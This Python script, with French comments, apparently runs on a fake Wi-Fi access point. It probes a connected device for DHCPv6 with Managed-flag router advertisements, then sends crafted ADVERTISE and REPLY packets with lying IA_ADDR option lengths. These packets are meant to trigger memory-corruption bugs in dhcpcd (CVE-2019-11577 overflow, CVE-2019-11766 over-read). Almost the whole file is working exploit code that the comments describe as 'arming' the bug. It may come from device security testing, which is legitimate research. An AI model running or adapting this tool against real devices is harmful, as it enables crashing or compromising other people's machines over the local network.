#!/usr/bin/env python3
"""dhcpv6_probe_fuzz — détermine si le device fait du DHCPv6, puis l'arme.

1) PROBE : on émet des RA avec flag Managed (M=1) depuis l'AP → si le dhcpcd
   du device a le v6 actif, il envoie un DHCPv6 SOLICIT en multicast
   ff02::1:2 (UDP 547). On écoute.
2) FUZZ : si SOLICIT arrive, on répond ADVERTISE avec des IA_NA dont les
   options IA_ADDR portent des longueurs mensongères → dhcpcd 6.8.2
   dhcp6_findna() fait `l -= sizeof(*o) + u32` SANS contrôle → sous-débordement
   size_t = CVE-2019-11577 (buffer overflow, fix upstream 7.2.1) → walk sauvage.
   + variante PD_EXCLUDE (CVE-2019-11766, over-read, fix 6.11.7).

Usage (device = client de notre AP TEST) :
  sudo python3 dhcpv6_probe_fuzz.py --probe              # RA M-flag + écoute 30 s
  sudo python3 dhcpv6_probe_fuzz.py --fuzz ia_na_len_lie # si SOLICIT vu
Log : /tmp/fakeap/dhcpv6.log
"""
import argparse
import fcntl
import socket
import struct
import sys
import time

sys.path.insert(0, "/home/pi/fakeap")
LOGF = "/tmp/fakeap/dhcpv6.log"
ALL_ROUTERS = "ff02::2"
ALL_RELAYS = "ff02::1:2"


def log(m):
    line = "%s %s" % (time.strftime("%H:%M:%S"), m)
    try:
        with open(LOGF, "a") as f:
            f.write(line + "\n")
    except OSError:
        pass
    print(line, flush=True)


def iface6(s, ifname):
    for line in open("/proc/net/if_inet6"):
        p = line.split()
        if p[5] == ifname and p[0].lower().startswith("fe80"):
            b = bytes.fromhex(p[0])
            return b, int(p[1], 16)
    # repli : première adresse v6 de l'iface
    for line in open("/proc/net/if_inet6"):
        p = line.split()
        if p[5] == ifname:
            return bytes.fromhex(p[0]), int(p[1], 16)
    raise SystemExit("pas d'adresse link-local v6 sur %s" % ifname)


def icmp6_cksum(src, dst, payload):
    pseudo = src + dst + struct.pack("!I", len(payload)) + b"\x00\x00\x00\x3a"
    d = pseudo + payload
    if len(d) & 1:
        d += b"\x00"
    s = 0
    for i in range(0, len(d), 2):
        s += (d[i] << 8) | d[i + 1]
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def send_ra_managed(raw, mac, ll, m_flag=True, o_flag=False):
    # RA : type 134, hoplimit, flags (M=0x80, O=0x40), lifetime, reachable, retrans
    flags = (0x80 if m_flag else 0) | (0x40 if o_flag else 0)
    body = bytes([64, flags]) + struct.pack("!H", 1800) + struct.pack("!II", 0, 0)
    body += bytes([1, 1]) + mac                      # SLLA
    pio = bytes([3, 4, 64, 0xC0]) + struct.pack("!III", 1800, 900, 0) + \
        socket.inet_pton(socket.AF_INET6, "fd00:feed::")
    body += pio
    icmp = bytes([134, 0, 0, 0]) + body
    dst = socket.inet_pton(socket.AF_INET6, "ff02::1")
    icmp = icmp[:2] + struct.pack("!H", icmp6_cksum(ll, dst, icmp)) + icmp[4:]
    ip6 = struct.pack("!IHBB", 6 << 28, len(icmp), 58, 255) + ll + dst
    eth = bytes.fromhex("333300000001") + mac + b"\x86\xdd"
    raw.send(eth + ip6 + icmp)


def dhcp6_option(code, data):
    return struct.pack("!HH", code, len(data)) + data


def build_advertise(trid, case, ll):
    # IA_NA avec IA_ADDR mensongers ; les longueurs d'option sont SUR NOTRE FIL
    m = bytes([1]) + struct.pack("!III", trid, 0, 0)   # ADVERTISE (2) plus bas
    hdr = bytes([2]) + struct.pack("!III", trid, 0, 0)
    if case == "ia_na_len_lie":
        # IA_ADDR dont len déclaré (24 minimum réel) est énorme → l -= (8+len) sous-déborde
        iaaddr = b"\x00" * 16 + struct.pack("!II", 3600, 3600)
        ia_na = dhcp6_option(5, b"\x00\x00\x00\x01" + struct.pack("!II", 3600, 3600) +
                             dhcp6_option(5, b"\x00" * 16 + struct.pack("!II", 3600, 3600)))
        # l'arme : option 5 (IA_ADDR) avec len=0xFFFF mais 24 octets réels
        bad = struct.pack("!HH", 5, 0xFFFF) + (b"\x00" * 16 + struct.pack("!II", 3600, 3600))
        ia_na_bad = struct.pack("!HH", 3, 0x1000) + b"\x00\x00\x00\x01" + \
            struct.pack("!II", 3600, 3600) + bad + bad
        opts = dhcp6_option(3, b"\x00\x00\x00\x01" + struct.pack("!II", 3600, 3600) + bad)
        opts += dhcp6_option(1, socket.inet_pton(socket.AF_INET6, "fd00:feed::1"))
        opts += dhcp6_option(2, struct.pack("!I", 3600) + b"\x00" * 10)
    elif case == "ia_na_many":
        bad = struct.pack("!HH", 5, 0xFFFF) + (b"\x00" * 16 + struct.pack("!II", 3600, 3600))
        opts = dhcp6_option(3, b"\x00\x00\x00\x01" + struct.pack("!II", 3600, 3600) + bad * 20)
        opts += dhcp6_option(1, socket.inet_pton(socket.AF_INET6, "fd00:feed::2"))
    elif case == "pd_exclude":                       # CVE-2019-11766
        iapd = b"\x00\x00\x00\x01" + struct.pack("!II", 3600, 3600)
        iaprefix = socket.inet_pton(socket.AF_INET6, "fd00:beef::") + b"\x40" + b"\x00" * 3 + \
            struct.pack("!II", 3600, 3600)
        excl = struct.pack("!HH", 67, 20) + b"\x80" + b"\x00" * 17   # /128 mal fichu
        opts = dhcp6_option(25, iapd + dhcp6_option(26, iaprefix) + excl)
    else:                                             # ctrl_ok
        good = dhcp6_option(5, b"\x00" * 15 + b"\x01" + struct.pack("!II", 3600, 3600))
        opts = dhcp6_option(3, b"\x00\x00\x00\x01" + struct.pack("!II", 3600, 3600) + good)
        opts += dhcp6_option(1, socket.inet_pton(socket.AF_INET6, "fd00:feed::3"))
        opts += dhcp6_option(2, struct.pack("!I", 3600) + b"\x00" * 10)
    return hdr + opts


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--iface", default="wlan0")
    ap.add_argument("--mode", default="probe", choices=["probe", "fuzz"])
    ap.add_argument("--case", default="ctrl_ok")
    ap.add_argument("--wait", type=int, default=30)
    a = ap.parse_args()

    raw = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    raw.bind((a.iface, 0))
    import array
    ai = array.array("B", b"\0" * 32)
    r = fcntl.ioctl(raw.fileno(), 0x8927, struct.pack("256s", a.iface.encode()[:15]) + ai.tobytes())
    mac = bytes(r[18:24])
    ll, _ = iface6(raw, a.iface)
    log("=== dhcpv6 %s iface=%s ===" % (a.mode, a.iface))

    # RA managed pour déclencher SOLICIT
    for i in range(3):
        send_ra_managed(raw, mac, ll)
        time.sleep(0.5)
    log("3 RA (M=1, PIO fd00:feed::/64) envoyés")

    # écoute SOLICIT (multicast ff02::1:2:547) + éventuellement ff02::1:2 sur UDP
    rs = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
    rs.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    rs.bind(("::", 547))
    mreq = socket.inet_pton(socket.AF_INET6, ALL_RELAYS) + \
        socket.inet_pton(socket.AF_INET6, "fe80::")[:8] + mac
    try:
        rs.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_JOIN_GROUP, mreq)
    except OSError:
        pass
    rs.settimeout(a.wait)
    solicit = None
    t0 = time.time()
    while time.time() - t0 < a.wait:
        try:
            data, addr = rs.recvfrom(2048)
        except socket.timeout:
            break
        mtype = data[0] if data else -1
        log("DHCPv6 reçu type=%d de %s (%d o)" % (mtype, addr[0], len(data)))
        if mtype == 1:
            solicit = (data, addr)
            break
    if not solicit:
        log("AUCUN SOLICIT — DHCPv6 inactif côté device (v4 only) → piste close")
        return
    log("★ SOLICIT reçu de %s — DHCPv6 ACTIF !" % solicit[1][0])
    if a.mode == "probe":
        log("relancer avec --mode fuzz --case ia_na_len_lie pour armer CVE-2019-11577")
        return
    # FUZZ : répondre ADVERTISE au SOLICIT
    data, addr = solicit
    trid = struct.unpack("!I", data[1:5])[0] if len(data) >= 5 else 0
    for case in [a.case]:
        adv = build_advertise(trid, case, ll)
        rs.sendto(adv, (addr[0], addr[1]))
        log("ADVERTISE cas=%s envoyé à %s:%d (%d o)" % (case, addr[0], addr[1], len(adv)))
    # attendre REQUEST puis re-répondre (REQUEST → REPLY avec mêmes options)
    rs.settimeout(15)
    t0 = time.time()
    while time.time() - t0 < 15:
        try:
            data, addr = rs.recvfrom(2048)
        except socket.timeout:
            break
        mtype = data[0]
        log("DHCPv6 reçu type=%d de %s" % (mtype, addr[0]))
        if mtype == 3:  # REQUEST → REPLY (c'est là que dhcp6_findna parse nos IA_NA)
            trid = struct.unpack("!I", data[1:5])[0] if len(data) >= 5 else 0
            reply = build_advertise(trid, a.case, ll)
            reply = bytes([7]) + reply[1:]           # type 7 = REPLY
            rs.sendto(reply, (addr[0], addr[1]))
            log("REPLY cas=%s envoyé (%d o) — LE PARSEUR VIENT DE MANGER NOS OPTIONS" % (a.case, len(reply)))


if __name__ == "__main__":
    main()
